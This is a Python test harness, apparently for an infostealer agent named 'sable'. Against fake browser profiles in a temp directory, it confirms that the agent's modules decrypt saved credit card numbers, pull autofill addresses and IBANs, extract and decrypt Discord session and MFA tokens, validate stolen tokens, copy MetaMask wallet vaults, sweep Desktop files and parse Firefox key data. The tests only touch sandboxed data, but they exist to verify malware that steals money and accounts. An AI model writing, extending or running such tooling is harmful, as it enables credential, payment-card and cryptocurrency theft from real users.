"""Second sandbox pass: autofill, sessions, wallets, documents, gecko helpers.

Every path is inside a temp directory. No real profile is read.
"""

from __future__ import annotations

import base64
import hashlib
import json
import sqlite3
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, r"C:\Users\Kuzenee\Desktop\55555\sable")

from Crypto.Cipher import AES

from agent.sources import autofill, documents, sessions, wallets
from agent.sources.browsers import chromium, gecko

KEY = bytes(range(32))
NONCE = bytes(range(12))
results: list[tuple[str, bool, str]] = []


def check(label: str, ok: bool, detail: str = "") -> None:
    results.append((label, ok, detail))


def seal(plain: bytes, prefix: bytes = b"v10") -> bytes:
    cipher = AES.new(KEY, AES.MODE_GCM, nonce=NONCE)
    ciphertext, tag = cipher.encrypt_and_digest(plain)
    return prefix + NONCE + ciphertext + tag


def table(connection: sqlite3.Connection, name: str, columns: str, rows: list) -> None:
    connection.execute(f"CREATE TABLE {name} ({columns})")
    if rows:
        marks = ", ".join("?" * len(rows[0]))
        connection.executemany(f"INSERT INTO {name} VALUES ({marks})", rows)


def test_autofill(root: Path) -> None:
    profile = root / "profile"
    profile.mkdir(parents=True)

    state = {"os_crypt": {}}
    (profile / "Local State").write_text(json.dumps(state), encoding="utf-8")

    web = sqlite3.connect(str(profile / "Web Data"))
    table(web, "autofill", "name TEXT, value TEXT, count INTEGER, date_last_used INTEGER",
          [("email", "killywilly@example.invalid", 9, 13340000000000000)])
    table(
        web,
        "credit_cards",
        "guid TEXT, name_on_card TEXT, expiration_month INTEGER, expiration_year INTEGER,"
        " card_number_encrypted BLOB, nickname TEXT",
        [("card-guid", "KILLYWILLY", 4, 2031, seal(b"4111111111111111"), "personal"),
         ("bad-guid", "BROKEN", 1, 2030, seal(b"0000000000000000", b"v11") + b"junk", "")],
    )
    table(
        web,
        "autofill_profiles",
        "guid TEXT, company_name TEXT, street_address TEXT, city TEXT, state TEXT,"
        " zipcode TEXT, country_code TEXT, use_count INTEGER",
        [("addr-guid", "Bench Ltd", "1 Shop Lane", "Sheffield", "SY", "S1 1AA", "GB", 3)],
    )
    table(web, "autofill_profile_names",
          "guid TEXT, first_name TEXT, middle_name TEXT, last_name TEXT",
          [("addr-guid", "Ollie", "", "Bench"), ("addr-guid", "O", "J", "Bench")])
    table(web, "autofill_profile_emails", "guid TEXT, email TEXT",
          [("addr-guid", "ollie@example.invalid")])
    table(web, "autofill_profile_phones", "guid TEXT, number TEXT",
          [("addr-guid", "+44 7000 000000")])
    table(web, "local_ibans", "guid TEXT, nickname TEXT, value TEXT",
          [("iban-guid", "bench", "GB00TEST00000000000000")])
    web.commit()
    web.close()

    out = root / "out"
    keys = chromium.Keys(user=KEY, app_bound=None)
    written = autofill._fields(chromium.copy_database(profile / "Web Data", root), out / "t")
    check("autofill fields", written == 1, f"wrote {written}")

    written = autofill._cards(chromium.copy_database(profile / "Web Data", root), out / "t", keys)
    cards = json.loads((out / "t" / "cards.json").read_text(encoding="utf-8"))
    check("card decrypts", cards and cards[0]["number"] == "4111111111111111", str(len(cards)))
    check("undecryptable card skipped", len(cards) == 1, f"{len(cards)} cards")

    written = autofill._addresses(chromium.copy_database(profile / "Web Data", root), out / "t")
    addresses = json.loads((out / "t" / "addresses.json").read_text(encoding="utf-8"))
    check("address joined names", len(addresses[0]["names"]) == 2, json.dumps(addresses[0])[:80])
    check("address emails", addresses[0]["emails"] == ["ollie@example.invalid"], "")
    check("address phones", addresses[0]["phones"] == ["+44 7000 000000"], "")

    written = autofill._ibans(chromium.copy_database(profile / "Web Data", root), out / "t")
    check("ibans", written == 1, f"wrote {written}")


def test_sessions(root: Path) -> None:
    leveldb = root / "profile" / "Local Storage" / "leveldb"
    leveldb.mkdir(parents=True)

    token = "mfa." + "A" * 84
    plain_jwt = "MTIzNDU2Nzg5MDEyMzQ1Njc4.Ga4rZk." + "B" * 38
    body = base64.b64encode(seal(b"encrypted-session-token-value")).decode()

    record = (
        b'\x00\x01_discord\x00' + b"dQw4w9WgXcQ:" + body.encode()
        + b"\x00\x02_discord2\x00" + b"dQw4w9WgXcQ:" + token.encode()
        + b"\x00\x03other\x00" + plain_jwt.encode()
    )
    (leveldb / "000003.log").write_bytes(record)

    hits = sessions._scan(leveldb)
    check("scan finds three", len(hits) == 3, str(hits))

    encrypted = [item for item in hits if item[1]]
    plain = [item for item in hits if not item[1]]
    check("base64 body stops at separator", len(encrypted[0][0]) < 700, str(len(encrypted[0][0])))

    keys = chromium.Keys(user=KEY, app_bound=None)
    decrypted = sessions._decrypt(encrypted[0][0], keys)
    check("session token decrypts", decrypted == "encrypted-session-token-value", repr(decrypted))

    for hit, label in ((token, "mfa token"), (plain_jwt, "jwt")):
        check(f"{label} recognised", any(hit.encode() == item[0] for item in plain), "")

    budget = [0]
    verdict = sessions._validate("not-a-real-token", budget)
    check("validation budget respected", verdict == (None, {}), str(verdict))


def test_wallets(root: Path) -> None:
    profile = root / "profile"
    settings = profile / "Local Extension Settings"
    metamask = settings / "nkbihfbeogaeaoehlefnkodbefgpgknn"
    metamask.mkdir(parents=True)
    (metamask / "000001.log").write_bytes(b"vault-bytes" * 100)
    (metamask / "MANIFEST-000001").write_bytes(b"manifest")

    oversized = settings / "bfnaelmomeimhlpmgjnjophhpkkoljpa"
    oversized.mkdir()
    (oversized / "big.log").write_bytes(b"x" * (9 * 1024 * 1024))

    out = root / "out"
    written = wallets._profile_wallets(profile, "chrome", out)
    check("wallet inventoried", written == 1, f"wrote {written}")

    listing = json.loads((out / "wallets" / "chrome" / "profile" / "wallets.json").read_text())
    check("wallet file count", listing[0]["files"] == 2, json.dumps(listing[0]))
    check("oversized wallet skipped", len(listing) == 1, f"{len(listing)} wallets")
    check("wallet bytes copied", (out / "wallets" / "chrome" / "profile" / "metamask"
                                  / "000001.log").stat().st_size == 1100, "")


def test_documents(root: Path) -> None:
    home = root / "home"
    desktop = home / "Desktop"
    (desktop / "nested" / "deep" / "deeper").mkdir(parents=True)
    (desktop / "notes.txt").write_text("x", encoding="utf-8")
    (desktop / "nested" / "photo.png").write_bytes(b"\x89PNG")
    (desktop / "nested" / "deep" / "deeper" / "buried.txt").write_text("y", encoding="utf-8")

    entries = documents._walk(desktop, 500)
    paths = [entry["path"] for entry in entries]
    check("walk finds shallow files", any("notes.txt" in p for p in paths), str(len(entries)))
    check("walk finds depth 2", any("photo.png" in p for p in paths), "")
    check("walk stops at depth cap", not any("buried.txt" in p for p in paths), "")

    capped = documents._walk(desktop, 1)
    check("walk honours limit", len(capped) == 1, str(len(capped)))


def test_gecko(root: Path) -> None:
    # Covered end to end by sable_gecko.py; here only the DER guard and padding.
    try:
        gecko._der_parse(b"\x30\x0a\x04\x08")
        raised = False
    except ValueError:
        raised = True
    check("der rejects a truncated value", raised, "")
    try:
        gecko._der_parse(b"\x30\x80" + b"\x00" * 8)
        raised = False
    except ValueError:
        raised = True
    check("der rejects indefinite length", raised, "")
    check("padding strips", gecko._strip_padding(b"data\x04\x04\x04\x04", 8) == b"data", "")
    check("padding rejects junk", gecko._strip_padding(b"data\x09\x09", 8) == b"data\x09\x09", "")


def main() -> int:
    with tempfile.TemporaryDirectory(prefix="sable-sandbox-") as scratch:
        base = Path(scratch)
        for name, runner in (
            ("autofill", test_autofill),
            ("sessions", test_sessions),
            ("wallets", test_wallets),
            ("documents", test_documents),
            ("gecko", test_gecko),
        ):
            target = base / name
            target.mkdir(parents=True)
            try:
                runner(target)
            except Exception as exc:  # noqa: BLE001 - the point is to see the failure
                import traceback
                traceback.print_exc()
                check(f"{name} crashed", False, f"{type(exc).__name__}: {exc}")

    failed = [item for item in results if not item[1]]
    for label, ok, detail in results:
        print(f"{'PASS' if ok else 'FAIL'}  {label}  {detail}")
    print(f"\n{len(results) - len(failed)}/{len(results)} passed")
    return 0 if not failed else 1


if __name__ == "__main__":
    raise SystemExit(main())
